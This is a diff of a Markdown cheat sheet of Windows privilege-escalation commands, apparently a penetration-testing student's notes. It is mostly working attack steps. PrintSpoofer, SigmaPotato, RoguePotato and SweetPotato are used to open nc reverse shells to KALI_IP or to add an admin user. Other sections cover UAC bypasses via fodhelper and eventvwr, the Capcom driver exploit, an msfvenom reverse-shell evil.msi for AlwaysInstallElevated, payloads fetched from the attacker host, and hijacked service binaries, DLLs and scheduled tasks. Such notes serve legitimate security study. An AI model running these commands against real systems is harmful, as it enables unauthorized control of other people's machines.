@@ -24,51 +24,59 @@ Invoke-PrivescCheck -Extended
 # 1 Check privs first
 whoami /priv
 
+
 ######################
 # PrintSpoofer64.exe #
 ######################
-# A) Reverse shell
+# A Reverse shell
 PrintSpoofer.exe -c "C:\TOOLS\nc.exe KALI_IP7 1337 -e powershell"
 
-# B) No GUI
+# B No GUI
 PrintSpoofer.exe -i -c cmd
 
-# C) GUI
+# C GUI
 qwinsta
 PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
 
 # https://github.com/itm4n/PrintSpoofer
 
+
 ###################
 # SigmaPotato.exe #
 ###################
-# A) Reverse Shell
+# A Reverse Shell
 .\SigmaPotato.exe --revshell KALI_IP 1234
 
-# B) Add local admin
+# B Add local admin
 .\SigmaPotato.exe "net user dave2 Password123 /add"
 .\SigmaPotato.exe "net localgroup Administrators dave2 /add"
+
 
 ###################
 # RoguePotato.exe #
 ###################
-# Reverse Shell
+# A Reverse Shell exe
 .\RoguePotato.exe -r KALI_IP -l 9999 -e C:\\Windows\\Temp\\reverse.exe
+
+# B Reverse shell PS Encoded
 .\RoguePotato.exe -r KALI_IP -l 9999 -e "powershell encoded"
 
 # https://k4sth4.github.io/Rogue-Potato/
 
+
 ###################
 # SweetPotato.exe #
 ####################
-# A) Reverse Shell
+# A Reverse Shell
 .\SweetPotato.exe [ -e EfsRpc ] -p .\nc.exe -a "KALI_IP 443 -e powershell"
 
-# B) Add local admin
+
+# B Add local admin
 .\SweetPotato.exe -p cmd.exe -a "net user dave2 Password123! /add"
 .\SweetPotato.exe -p cmd.exe -a "net localgroup Administrators dave2 /add"
 
 # https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all#bkmrk-sweetpotato
+
 
 #######################
 # compatibility check #
@@ -86,11 +94,11 @@ systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System T
 # 1 View potential saved creds
 cmdkey /list
 
-# A) Reverse Shell
+# A Reverse Shell
 runas /savedcred /env /noprofile /user:SAVED_USER C:\path\to\reverse.exe
 runas /savedcred /env /noprofile /user:DOMAIN\SAVED_USER powershell
 
-# B) GUI
+# B GUI
 runas /savedcred /env /noprofile /user:SAVED_USER powershell
 
 # https://medium.com/@unowmie/konnichiwa-senpai-ef28789664eb
@@ -127,16 +135,18 @@ UAC for everyone
 # Fodhelper.exe #
 #################
 
-# A) LOLBAS One-hit wonder
+# A LOLBAS One-hit wonder
 powershell Start-Process cmd.exe -Verb runAs
 Fodhelper.exe Bypass
 
-# B) Fodhelper.ps1 (cmd.exe default)
+
+# B Fodhelper.ps1 (cmd.exe default)
 . .\FodhelperBypass.ps1
 FodhelperBypass
 FodhelperUACBypass -program "cmd.exe /c powershell.exe"
 
-# C) Manual
+
+# C Manual
 # 1 CHECK for Medium integrity
 whoami /groups | findstr Level
 
@@ -169,11 +179,11 @@ Start-Process "C:\Windows\SysWOW64\fodhelper.exe" -WindowStyle Hidden
 # https://topi.gitbook.io/t0pitheripper/master/windows-privesc/uac-bypass
 # https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
 
+
 ################
 # Eventvwr.exe #
 ################
-
-# A) Using eventvwr-bypassuac.exe
+# A Using eventvwr-bypassuac.exe
 # 1 FIND location
 where /r C:\\windows eventvwr.exe
 
@@ -192,11 +202,14 @@ x86_64-w64-mingw32-gcc eventvwr-bypassuac.c -o eventvwr-bypassuac-64.exe
 
 # https://github.com/k4sth4/UAC-bypass
 
-# B) Using Invoke-EventViewer.ps1  (needs to be in C:\windows\Tasks folder)
+
+# B Using Invoke-EventViewer.ps1  (needs to be in C:\windows\Tasks folder)
 . .\Invoke-EventViewer.ps1
 Invoke-EventViewer cmd.exe | powershell.exe
 
+
 # https://github.com/CsEnox/EventViewer-UACBypass/tree/main
+# https://juggernaut-sec.com/uac-bypass/#UAC-Bypass_Using_netplwizexe_Help_Topics_GUI
 ```
 ## SeLoadDriverPriv
 ***Enable the priv, and using the exploit you get a reverse shell***
@@ -206,14 +219,18 @@ iwr -uri http://KALI_IP/windows/eoploaddriver_x64.exe -outfile .
 iwr -uri http://KALI_IP/windows/Capcom.sys -outfile .
 iwr -uri http://KALI_IP/windows/ExploitCapcom.exe -outfile .
 
+
 # 2 ENABLE the priv
 .\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\\Temp\\Capcom.sys
+
 
 # 3 LOAD capcom
 .\ExploitCapcom.exe LOAD C:\\Temp\\Capcom.sys
 
+
 # 4 TEST
 .\ExploitCapcom.exe LOAD C:\\Temp\\Capcom.sys
+
 
 # 5 ATTACK
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=`mip` LPORT=443 -f exe > reverse.exe
@@ -225,23 +242,23 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=`mip` LPORT=443 -f exe > reverse
 ## AlwaysInstallElevated
 ***If both keys below are 1, then exploitable w/ an evil.msi***
 ```shell
-# A) reverse shell
-#
+# A reverse shell
 # 1 CHECK Winpeas, or manually
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
-#
+
 # 2 GENERATE a malicious .msi and transfer to victim
 msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f msi -o evil.msi
-#
+
 # 3 TRANSFER to writeable folder
 iwr -uri http://KALI_IP/windows/evil.msi -outfile evil.msi
-#
-# A) msiexec
+
+# a) msiexec
 msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
-#
-# B) directly execute
+
+# b) directly execute
 .\evil.msi
+
 
 # If doesn't work
 # -> Try a Different port like 21
@@ -278,7 +295,7 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 ## SeManageVolumePriv
 ```shell
-
+# https://github.com/CsEnox/SeManageVolumeExploit
 ```
 ## Kernel Vulns 
 ***Search for potential kernel exploits using systeminfo and hotfixes***
@@ -481,11 +498,20 @@ icacls [folder/file] /grant [user]:[permission] /t /c # grant/allow
 icacls [folder/file] /deny [user]:[permission] /t /c ⇒ deny # this is useful if, for example, members of a group inherit access to a file but a specific user should be denied access.
 icacls [folder/file] /remove [user]:[permission] /t /c # remove permission
 
+
 ########################################
 # accesschk.exe look for WRITE or FULL #
 ########################################
 accesschk.exe /accepteula -uwcqv <username> * | "C:\Program Files\Juggernaut\Juggernaut.exe"
+
 accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+
+#######
+# gci #
+#######
+# checks recursively if we have access to folders and files
+gci -Recurse C:\users | Select FullName
 ```
 # *Services / Procs*
 ## Enum
@@ -563,53 +589,57 @@ Get-Process | Select-Object -ExpandProperty Path
 4. *Everyone*
 5. *NT Authority/Interactive* 
 ```shell
-# Manual
-# 1. FIND potential service binaries, check privs and startmode
+# A Manual
+# 1 FIND potential service binaries, check privs and startmode
 
-# 2. CHECK Permissions (examples provided)
+# 2 CHECK Permissions (examples provided)
 icacls FULL_PATH_TO_BINARY
 icacls "C:\xampp\apache\bin\httpd.exe"
 icacls "C:\xampp\mysql\bin\mysqld.exe"
 
-# 3. COMPILE adduser.c if not already
+# 3 COMPILE adduser.c if not already
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
-# 4. TRANSFER to target and copy to correct directoy
+# 4 TRANSFER to target and copy to correct directoy
 iwr -uri http://KALI_IP/windows/adduser.exe -outfile adduser.exe
 move "C:\path\to\binary" binary.bak.exe
 move .\adduser.exe "C:\path\to\binary"
 
-# 5. TRY restarting the service or reboot 
+# 5 TRY restarting the service or reboot 
 # a) PS
 Restart-Service 'SERVICE_NAME'
-#
+
 # b) net
 net stop mysql
 net start mysql
 
-# Check myadmin user is in Administrators group and RUN ADMIN powershell #
+#
+# 6 Check myadmin user is in Administrators group and RUN ADMIN powershell
 $username = 'user'
 $password = 'password'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-#https://stackoverflow.com/questions/28989750/running-powershell-as-another-user-and-launching-a-script
-
-# no gui / gui
+#
+# no gui
 Start-Process PowerShell -Credential $credential
+#
+# gui
 Start-Process PowerShell -Runas
 
+# https://stackoverflow.com/questions/28989750/running-powershell-as-another-user-and-launching-a-script
 
 
-# Powerup
-#
-# 1. VIEW
+
+# B Powerup
+# 1 View
 Get-ModifiableSerivceFile
-#
-# Attack #
+
+# 2 ATTACK
 Install-ServiceBinary -Name 'SERVICE NAME'
 
 
 
+# Notes
 # If Restart fail check if you can reboot i.e SeShutdownPrivilege
 #
 whoami /priv
@@ -625,82 +655,87 @@ shutdown /r /t 0
 5. *NT Authority/Interactive*
 ```
 C:\Program Files\My Program\My Service\service.exe
-
 C:\Program.exe
 C:\Program Files\My.exe
 C:\Program Files\My Program\My.exe
 C:\Program Files\My Program\My service\service.exe
 ```
-
 ```shell
-# 1. Get potential unquoted-paths
+# A Manual
+# 1 Get potential unquoted-paths from
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+```shell
+Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
 
-# 2. CHECK permissions
+# 2 CHECK permissions
 
-# 3. IF PATH found, use the adduser.exe binary and restart or reboot
+# 3 IF PATH found, use the adduser.exe binary and restart or reboot
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
-# 4. TRANSFER and copy to correct dir (below just uses example)
+# 4 TRANSFER and copy to correct dir (below just uses example)
 iwr -uri http://KALI_IP/resources/adduser.exe -outfile adduser.exe
 copy .\adduser.exe 'C:\Program Files\Enterprise Apps\Current.exe'
 
-# RESTART service
+# 5 RESTART service
 Stop-Service GammaService
 Start-Service GammaService
 
 
-#
-# Powerup
-# 1. VIEW
+# B Powerup
+# 1 VIEW
 Get-UnquotedService
 
-# 2. ATTACK
+# 2 ATTACK
 Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
 
 
-#
+
+# Notes #
 # If Restart fail check if you can reboot i.e SeShutdownPrivilege
 whoami /priv
 shutdown /r /t 0
+
+
+# https://juggernaut-sec.com/unquoted-service-paths/
 ```
 ## Modifiable Service
 ```shell
-# Manual
+# A Manual
 # a) adduser.exe
-# 1. COMPILE adduser.c if not already
+# 1 COMPILE adduser.c if not already
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
-# 2. TRASNSFER to target and change permissions
+# 2 TRASNSFER to target and change permissions
 iwr -uri http://KALI_IP/resources/adduser.exe -outfile adduser.exe
 icacls .\adduser.exe /grant Everyone:F
 
-# 3. CONFIG service to use adduser.exe and restart the service
+# 3 CONFIG service to use adduser.exe and restart the service
 sc config SERVICE_NAME binpath="C:\Users\PATH\TO\adduser.exe" obj=LocalSystem
 
-# 4. CHECK service configured properly & restarrt
+# 4 CHECK service configured properly & restarrt
 sc qc SERVICE_NAME
 sc stop SERVICE_NAME
 sc start SERIVCE_NAME
 
-# OR #
 
 # b) Add current user as Local Admin
-# 1. CONFIG service to add our current user as local admin
+# 1 CONFIG service to add our current user as local admin
 sc config SERVICE_NAME binpath="cmd /c net localgroup administrators USER /add" obj=LocalSystem
 
-# 2. CHECK service configured properly & restart
+# 2 CHECK service configured properly & restart
 sc qc SERVICE_NAME
 sc stop SERVICE_NAME
 sc start SERIVCE_NAME
 
 
-# Auto
-# PowerUp
-# 1. GET such service
+# B PowerUp
+# 1 GET such service
 Get-ModifiableService
 
-# 2. ATTACK
+# 2 ATTACK
 Invoke-ServiceAbuse -Name 'VULN_SERVICE'
+
 
 # https://medium.com/r3d-buck3t/privilege-escalation-with-insecure-windows-service-permissions-5d97312db107
 ```
@@ -714,7 +749,7 @@ Invoke-ServiceAbuse -Name 'VULN_SERVICE'
 6. *PATH environment variable*
 ***The privileges the DLL will run with depend on the privileges used to start the application, so need admin user to TRIGGER the application***
 ```shell
-# A) Manual
+# A Manual
 # 1 CHECK WRITE permission to the application path (ex. using "FileZilla FTP Client" app)
 echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
 type 'C:\FileZilla\FileZilla FTP Client\test.txt'
@@ -731,88 +766,92 @@ x86_64-w64-mingw32-gcc mydll.cpp --shared -o TextShaping.dll
 iwr -uri http://KALI_IP/resources/TextShaping.dll -outfile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
 
 
-
-# B) Get-PotentialDLLHijack.ps1
+# B Get-PotentialDLLHijack.ps1
 # 1 Use procmon as above but save data to csv and transfer to TARGET
+
 # 2 Run and examine the output
 . .\Get-PotentialDLLHijack.ps1
 Get-PotentialDLLHijack -CSVPath .\Logfile.CSV -MaliciousDLLPath .\DLLHijackTest.dll -ProcessPath "C:\Users\John\AppData\Local\Programs\Microsoft VS Code\Code.exe"
  
 
-
 # https://github.com/slyd0g/DLLHijackTest?tab=readme-ov-file
 ```
 # *Scheduled Tasks*
-## Enum
+## Enum Tasks
 ```shell
+# A schtasks
+# Gets the task RUN AS USER most importantly
 schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Next Run Time" /C:"Author" /C:"Task To Run" /C:"Run As User" /C:"Scheduled Task State" /C:"Schedule" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"
 
-Get-ScheduledTask | where {$_.TaskPath -notlike  "\Microsoft*"} | Format-List TaskName,TaskPath,Actions,Principal,Author,Triggers,State,LastRunTime,NextRunTime,Description,Enabled
 
-# Check Manually also in potentially interesting folders
+# B Get-ScheduledTask
+# Principal == RUN AS USER
+# Actions.Execute == Executable Path
+Get-ScheduledTask | where {$_.TaskPath -notlike  "\Microsoft*"} | Format-List TaskName,TaskPath,Actions,Actions.Execute,Triggers,State,LastRunTime,NextRunTime,Description,Enabled,Author,Principal
 
 
-# From Registry
+# C From Registry
 $TaskRegistryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"
-$TaskName="TaskName" # Replace with the task name
+
+$TaskName="TASK_NAME" # Replace with the task name
 $SD=Get-ItemProperty -Path "$TaskRegistryPath\$TaskName" -Name "SD"
 
 $Descriptor=New-Object System.Security.AccessControl.RawSecurityDescriptor ([System.Text.Encoding]::Default.GetString($SD.SD)) $Descriptor.DiscretionaryAcl | ForEach-Object { $_ }
+
+# https://community.spiceworks.com/t/how-can-i-get-a-list-of-the-run-as-user-for-scheduled-tasks/938371
 ```
 ## Writeable Task
-***Look for F, M, W on the files.***
+***USING ABOVE ENUM, Look for F, M, W on the files.***
 ***Important when querying:***
 1. *Which principal is the task running as*
 2. *Triggers specified for the task*
 3. *Actions executed when one or more of these triggers are met*
 ```shell
-# 1. SEARCH TASKS and see what seems out of normal:
-```
+# 1 SEARCH TASKS using Above ENUM
 
-```shell
-# 2. LOOK FOR for potentially hidden script folders and look for permissions
+
+# 2 LOOK FOR for SUSCPICIOUS OR HIDDEN folders that may house scripts and look for permissions
+gci -Recurse C:\users | Select FullName
+
 Get-ChildItem -Path . -Force -Recurse | Where-Object { $_.Attributes -match 'Hidden' }
 
 dir /s /a:h C:\
-```
 
-```shell
-# 3. CHECK PERMISSIONS on the found task eg. icacls C:\path\to\SuscpiciousTask.exe
-```
 
-```shell
-# 4. USE adduser.exe payload and replace the writeable file
+# 3. CHECK PERMISSIONS on the found task EX: 
+icacls C:\path\to\SuscpiciousTask.exe
+accesschk.exe /accepteula -uwcqv <username> * | "C:\Program Files\Juggernaut\Juggernaut.exe"
+
+
+# 4 USE adduser.exe payload and replace the writeable file
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
-```
 
-```shell
-# 5. TRANSFER and replace the writeable task
+
+# 5 TRANSFER and replace the writeable task
 iwr -uri http://KALI_IP/windows/adduser.exe -outfile BackendCacheCleanup.exe
 move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
 move .\BackendCacheCleanup.exe .\Pictures\
-```
 
-```shell
-# 6. Check for "myadmin" in Administrators group
+
+#
+# 6 Check for "myadmin" in Administrators group
 ```
 
 # *Logs*
 ```shell
-# Manual
 # *.log, *.txt, *.conf, *.error, *.debug
 # C:\Program Files\<appname>
 # C:\Program Files (x86)\<appname>
 # C:\Temp
 # C:\Users\<User>\AppData\Local\Temp
 
-
-# Manual
+# A Manual
 $Directory="C:\ServiceOrAppFolder"; Get-ChildItem -Path $Directory -Filter *.log -Recurse | Select-Object FullName, LastWriteTime | Format-Table -AutoSize
 
 $Directory = "C:\NonStandardPath"; Get-ChildItem -Path $Directory -Recurse -Include *.log, *.service -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime | Format-Table -AutoSize
 
 
-# Reg
+# B Reg
 Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>" | Select-Object -Property *
 
 Get-WinEvent -LogName System | Where-Object { $_.Id -in 7000, 7001, 7011, 7034, 7045 } | Select TimeCreated, Id, Message
@@ -822,7 +861,7 @@ Get-WinEvent -LogName System -MaxEvents 1000 | Where-Object { $_.Message -like "
 Get-WinEvent -LogName Application -MaxEvents 1000 | Where-Object { $_.Message -match "(?i)(log|service)" } | Select-Object TimeCreated, Id, LevelDisplayName, Message | Format-Table -AutoSize
 
 
-# EventViewer
+# C EventViewer
 eventvwr.msc → Windows Logs → System and Application
 Filter for 7000, 7001, 7011, 7034, 7045
 ```
